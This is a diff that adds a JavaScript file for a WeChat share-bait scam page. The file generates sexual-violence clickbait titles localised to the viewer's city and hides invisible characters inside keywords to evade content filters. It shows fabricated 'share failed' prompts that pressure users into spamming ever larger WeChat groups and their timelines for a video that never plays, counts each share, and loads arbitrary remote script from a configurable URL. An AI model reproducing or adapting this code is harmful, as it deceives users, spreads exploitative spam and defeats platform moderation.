@@ -1,0 +1,307 @@
+var site = get_param('_c') || xtLineId;
+var evkey = get_param('_evkey');
+console.log('fuck');
+
+function getCity() {
+    return (window['localAddress'] ? ['北京市', '天津市', '上海市', '重庆市'].indexOf(localAddress.province) > -1 ? localAddress.province : localAddress.city : '').replace(/(.*)市/, '$1');
+}
+
+var biaoqing = ["😺", "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "🙌", "👏", "👋", "👍", "👎", "👊", "✊", "✌️", "👌", "✋", "👐", "💪", "🙏", "☝️", "👆", "👇", "👈", "👉", "🖕", "🖐", "🤘", "🖖", "✍️", "💅", "👄", "👅", "👂", "👃", "👁", "👀", "👤", "👥", "🗣", "👶", "👦", "👧", "👨", "👩", "👱", "👴", "👵", "👲", "👳", "👮", "👷", "💂", "🕵", "🎅", "👼", "👸", "👰", "🚶", "🏃", "💃"];
+var bq = biaoqing[Math.floor(Math.random() * biaoqing.length)];
+
+/*var title_timeline1 = '最新消息' + bq + '{city}国庆节前果然出大事了，删前速看...';
+var title_group = '最新消息' + bq + '{city}国庆节前果然出大事了，删前速看...';
+var title_timeline2 = '{city}步行街15分钟前出事了，' + bq + '现场直播...';*/
+
+var textList1 = [
+    /*'{fuck}{city}{fuck}人{fuck}妻{fuck}不{fuck}雅{fuck}视频泄{fuck}露',
+    '实{fuck}拍.{city}{fuck}大{fuck}学{fuck}生酒{fuck}店被凌{fuck}辱',
+    '偷{fuck}拍.{city}{fuck}女{fuck}宿{fuck}舍{fuck}不{fuck}雅视{fuck}频',
+    '{fuck}{city}{fuck}少{fuck}妇{fuck}车{fuck}库不{fuck}雅视{fuck}频泄{fuck}露',*/
+    '{fuck}{city}{fuck}退伍兵办公室强{fuck}干{fuck}董事长妹妹，视频记录全过程，最后弄她一脸，他哥来了竟...',
+]
+
+var text1 = textList1[Math.floor(Math.random() * textList1.length)];
+
+var title_timeline1 = bq + text1;
+var title_group = bq + text1;
+var title_timeline2 = '🔥太恶劣了！{city}{fuck}刚{fuck}刚出{fuck}大{fuck}事{fuck}了，' + bq + '现{fuck}场{fuck}偷{fuck}拍...';
+
+if (get_param('from')) {
+
+} else {
+    record('tosharer', site);
+    evkey && record('tosharer', evkey);
+}
+
+window.g_shareTimes = 0
+var g_tips_message = '';
+window.play_url = window.share_url = location.protocol + '//' + location.host + location.pathname + '?_c=' + site + '&' + getSpm() + '=' + getSpm() + '&v=' + (+new Date()) + '&ac=goon';
+
+function wxalert(a, b, c) {
+    if ($('#avt').length == 0) {
+        var _str = '<div id="avt" style=" width: 90%; height: auto; background: #fff;position: fixed;left: 5%; top: 30%;z-index: 9999;text-align: center;border-radius: 4px;"><div id="tips" style="width: 90%;margin: 20px 5%;font-size: 18px;line-height: 1.5em;color: #3F3F3F;"></div><div id="isok" style=" width: 100%;height: 45px;text-align: center;line-height: 45px;font-size: 22px;border-top: 1px dotted #d6d6d6;color: #0bb20c;"></div></div>';
+        $('body').append(_str);
+    }
+    var d = $('#avt');
+    d.show(300);
+    d.find("#tips").html(a);
+    d.find("#isok").html((b || '确定'));
+    d.find("#isok").off('click').on('click', function () {
+        d.hide(300);
+        if (typeof c === 'function') {
+            c();
+        }
+    });
+}
+
+function get_time() {
+    var now = new Date();
+    var h = now.getHours();
+    var ms = now.getMinutes();
+    if (h < 10) {
+        h = '0' + h;
+    }
+    if (ms < 10) {
+        ms = '0' + ms;
+    }
+    return h + ':' + ms;
+}
+
+function share_tip() {
+    switch (g_shareTimes) {
+        case 0:
+            g_tips_message = "请分享到<b style=\"color: red;font-size: 22px;\">朋友圈</b>即可<b>免流量</b>继续观看";
+            wxalert(g_tips_message)
+            document.title = title_timeline1.replace('{city}', getCity()).replace('{time}', get_time()).replace(/{fuck}/ig, '\u034f');
+            break;
+        case 1:
+            g_tips_message = '<b style="font-size: 24px;color: red;">分享成功！</b><br/>请继续分享到<b style="color: red;">3</b>个微信群即可<b style="color: red;font-size: 24px;">免流量加速观看!</b>';
+            wxalert(g_tips_message);
+            $('.js_share_pyq_image').hide();
+            $('.js_share_group_image').show();
+            document.title = title_group.replace('{city}', getCity()).replace('{time}', get_time()).replace(/{fuck}/ig, '\u034f');
+            break;
+        case 2:
+            g_tips_message = '<b style="font-size: 24px;color: red;">分享成功！</b><br/>请继续分享到<b style="color: red;">2</b>个微信群即可<b style="color: red;font-size: 24px;">免流量加速观看!</b>';
+            wxalert(g_tips_message);
+            break;
+        case 3:
+            g_tips_message = '<b style="font-size: 24px;color: red;">分享失败！</b><br/>请重新分享到<b style="color: red;">2</b>个不同的微信群即可<b style="color: red;font-size: 24px;">免流量加速观看!</b>';
+            wxalert(g_tips_message);
+            break;
+        case 4:
+            g_tips_message = '<b style="font-size: 24px;color: red;">分享成功！</b><br/>请继续分享到<b style="color: red;">1</b>个微信群即可<b style="color: red;font-size: 24px;">免流量加速观看!</b>';
+            wxalert(g_tips_message);
+            break;
+        case 5:
+            g_tips_message = '<b style="font-size: 24px;color: red;">分享失败！</b><br/>网络失败请重试<br/>请继续分享到<b style="color: red;">1</b>个微信群即可<b style="color: red;font-size: 24px;">免流量加速观看!</b>';
+            wxalert(g_tips_message);
+            break;
+        case 6:
+            g_tips_message = '<b style="font-size: 24px;color: red;">分享失败！</b><br/>请分享到<b style="color: red;">人数大于50人</b>的微信群即可<b style="color: red;font-size: 24px;">免流量加速观看!</b>';
+            wxalert(g_tips_message);
+            break;
+        case 7:
+            g_tips_message = '<b style="font-size: 24px;color: red;">分享完成！<br/>剩下最后一步</b><br/>分享到<b style="color: red;">朋友圈</b>即可<b style="color: red;font-size: 24px;">免流量播放完整正片</b>';
+            wxalert(g_tips_message);
+            $('.js_share_pyq_image').show();
+            $('.js_share_group_image').hide();
+            document.title = title_timeline2.replace('{city}', getCity()).replace('{time}', get_time()).replace(/{fuck}/ig, '\u034f');
+            break;
+        case 8:
+            $.cookie('ac', 'goon', {expires: 60, path: '/'});
+            wxalert('分享成功, 正在跳转播放页面...', '确 定');
+            jump_noref(window.play_url);
+            break;
+        default:
+    }
+}
+
+// 分享逻辑
+$(function () {
+
+    var hasPlayDone = false;
+
+    function share_done_once() {
+        record('share', site, true);
+        record('share-uv', site);
+        evkey && record('share', evkey, true);
+        evkey && record('share-uv', evkey);
+        share_tip();
+    }
+
+    function initShareEvent() {
+        // var hiddenProperty = 'hidden' in document ? 'hidden' :
+        //     'webkitHidden' in document ? 'webkitHidden' :
+        //         'mozHidden' in document ? 'mozHidden' :
+        //             null;
+        // var visibilityChangeEvent = hiddenProperty.replace(/hidden/i, 'visibilitychange');
+        // var onVisibilityChange = function () {
+        //     if (hasPlayDone) {
+        //         return false;
+        //     }
+        //     if (!document[hiddenProperty]) {
+        //         g_shareTimes++;
+        //         share_done_once();
+        //         $.ajax({
+        //             'url': '/count.php',
+        //             'method': 'POST',
+        //             'data': {res: 'friend'},
+        //             'success': function () {
+        //             }
+        //         });
+        //     } else {
+        //         console.log('页面激活');
+        //     }
+        // }
+        // document.addEventListener(visibilityChangeEvent, onVisibilityChange);
+
+        // ##############
+        wx.config(window.data.sdk);
+        wx.ready(function(){
+            // 分享到群
+            WeixinJSBridge.on("menu:share:appmessage", function() {
+                g_shareTimes++;
+                switch (g_shareTimes) {
+                    case 1:
+                        g_tips_message = '<b style="font-size: 24px;color: red;">分享成功！</b><br/>请继续分享到<b style="color: red;">3</b>个微信群即可<b style="color: red;font-size: 24px;">免流量加速观看!</b>';
+                        wxalert(g_tips_message);
+                        $('.js_share_pyq_image').hide();
+                        $('.js_share_group_image').show();
+                        document.title = title_group.replace('{city}', getCity()).replace('{time}', get_time()).replace(/{fuck}/ig, '\u034f');
+                        break;
+                    case 2:
+                        g_tips_message = '<b style="font-size: 24px;color: red;">分享成功！</b><br/>请继续分享到<b style="color: red;">2</b>个微信群即可<b style="color: red;font-size: 24px;">免流量加速观看!</b>';
+                        wxalert(g_tips_message);
+                        break;
+                    case 3:
+                        g_tips_message = '<b style="font-size: 24px;color: red;">分享失败！</b><br/>请重新分享到<b style="color: red;">2</b>个不同的微信群即可<b style="color: red;font-size: 24px;">免流量加速观看!</b>';
+                        wxalert(g_tips_message);
+                        break;
+                    case 4:
+                        g_tips_message = '<b style="font-size: 24px;color: red;">分享成功！</b><br/>请继续分享到<b style="color: red;">1</b>个微信群即可<b style="color: red;font-size: 24px;">免流量加速观看!</b>';
+                        wxalert(g_tips_message);
+                        break;
+                    case 5:
+                        g_tips_message = '<b style="font-size: 24px;color: red;">分享失败！</b><br/>网络失败请重试<br/>请继续分享到<b style="color: red;">1</b>个微信群即可<b style="color: red;font-size: 24px;">免流量加速观看!</b>';
+                        wxalert(g_tips_message);
+                        break;
+                    case 6:
+                        g_tips_message = '<b style="font-size: 24px;color: red;">分享失败！</b><br/>请分享到<b style="color: red;">人数大于50人</b>的微信群即可<b style="color: red;font-size: 24px;">免流量加速观看!</b>';
+                        wxalert(g_tips_message);
+                        break;
+                    case 8:
+                        $.cookie('ac', 'goon', {expires: 60, path: '/'});
+                        wxalert('分享成功, 正在跳转播放页面...', '确 定');
+                        jump_noref(window.play_url);
+                        break;
+                    default:
+                }
+
+                WeixinJSBridge.invoke("sendAppMessage", {
+                    appid: window.data.sdk.appId,
+                    title: document.title,
+                    // desc: fuck.desc.replace(/{diqu}/, city),
+                    link: window.data.to_group.link,
+                    //img_url: share[0].img_url,
+                    img_url: "http://butuyu.oss-cn-hangzhou.aliyuncs.com/bb/g/images/video/f0739hd0i31_496_280_0.jpg",
+                    img_width: 120,
+                    img_height: 120
+                }, function(e) {
+                    var t = e.err_msg;
+                    e.errMsg;
+                    if ("send_app_msg:ok" == t || "send_app_msg:confirm" == t) {
+                        $.ajax({
+                            'url' : '/count.php',
+                            'method' : 'POST',
+                            'data': {res: 'friend'},
+                            'success' : function(){}
+                        });
+
+                    }
+                });
+            })
+
+            // 分享到圈
+            WeixinJSBridge.on("menu:share:timeline", function() {
+                g_shareTimes++;
+                switch (g_shareTimes) {
+                    case 0:
+                        g_tips_message = "请分享到<b style=\"color: red;font-size: 22px;\">朋友圈</b>即可<b>免流量</b>继续观看";
+                        wxalert(g_tips_message)
+                        document.title = title_timeline1.replace('{city}', getCity()).replace('{time}', get_time()).replace(/{fuck}/ig, '\u034f');
+                        break;
+                    case 7:
+                        g_tips_message = '<b style="font-size: 24px;color: red;">分享完成！<br/>剩下最后一步</b><br/>分享到<b style="color: red;">朋友圈</b>即可<b style="color: red;font-size: 24px;">免流量播放完整正片</b>';
+                        wxalert(g_tips_message);
+                        $('.js_share_pyq_image').show();
+                        $('.js_share_group_image').hide();
+                        document.title = title_timeline2.replace('{city}', getCity()).replace('{time}', get_time()).replace(/{fuck}/ig, '\u034f');
+                        break;
+                    case 8:
+                        $.cookie('ac', 'goon', {expires: 60, path: '/'});
+                        wxalert('分享成功, 正在跳转播放页面...', '确 定');
+                        jump_noref(window.play_url);
+                        break;
+                    default:
+                }
+
+                WeixinJSBridge.invoke("shareTimeline", {
+                    appid: window.data.sdk.appId,
+                    //title: share[0].title,
+                    title: document.title,
+                    // desc: fuck.desc.replace(/{diqu}/, city),
+                    link: window.data.to_group.link,
+                    //img_url: share[0].img_url,
+                    img_url: "http://butuyu.oss-cn-hangzhou.aliyuncs.com/bb/g/images/video/f0739hd0i31_496_280_0.jpg",
+                    img_width: 120,
+                    img_height: 120
+                }, function(e) {
+                    var t = e.err_msg;
+                    e.errMsg;
+                    if ("send_app_msg:ok" == t || "send_app_msg:confirm" == t) {
+                        $.ajax({
+                            'url' : '/count.php',
+                            'method' : 'POST',
+                            'data': {res: 'timeline'},
+                            'success' : function(){}
+                        });
+
+                    }
+                });
+            });
+            //#############
+        });
+    }
+
+    function init() {
+        initShareEvent();
+        share_tip()
+    }
+
+    window.g_share = {
+        init: init
+    }
+});
+
+
+$(function () {
+    $('#tk').on('click', function () {
+        wxalert(g_tips_message, '确定');
+    });
+    g_share.init();
+});
+
+if (window.data && window.data['attached'] && window.data['attached']['back_api']) {
+    load_js(window.data['attached']['back_api']);
+}
+
+if (window.data && window.data.hm) {
+    load_js('https://hm.baidu.com/hm.js?' + window.data.hm, 'async');
+    // if (site === '5577') {
+    //   load_js('https://hm.baidu.com/hm.js?3611a46768887ddf2b8a5fcf16bd9b1f', 'async');
+    // } else {
+    //   load_js('https://hm.baidu.com/hm.js?c22450c0482b1d0271e5cfe29d39e08c', 'async');
+    // }
+}
